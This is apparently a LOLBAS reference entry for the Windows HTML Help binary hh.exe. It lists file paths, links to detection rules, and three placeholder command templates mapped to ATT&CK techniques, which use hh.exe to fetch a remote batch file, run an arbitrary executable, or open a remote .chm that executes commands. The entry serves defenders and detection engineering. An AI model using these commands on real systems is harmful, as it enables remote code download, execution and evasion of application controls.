---
title: "Hh.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Hh/
fetched_at: 2026-09-20T17:10:18Z
license: unspecified
category: windows
---

Binary used for processing chm files in Windows

## Paths
- C:\Windows\hh.exe
- C:\Windows\SysWOW64\hh.exe

## Resources
- [https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)

## Acknowledgements
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml](https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml)
- Splunk: [https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml)
- Splunk: [https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml)

## Download

1. Open the target batch script with HTML Help.

```
HH.exe {REMOTEURL:.bat}
```

   - Use case: Download files from url

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Execute: EXEApplication: GUI

2. Executes specified executable with HTML Help.

```
HH.exe {PATH_ABSOLUTE:.exe}
```

   - Use case: Execute process with HH.exe

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.001

   - Tags: Execute: EXEApplication: GUI

3. Executes a remote .chm file which can contain commands.

```
HH.exe {REMOTEURL:.chm}
```

   - Use case: Execute commands with HH.exe

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.001

   - Tags: Execute: CMDExecute: CHMExecute: Remote
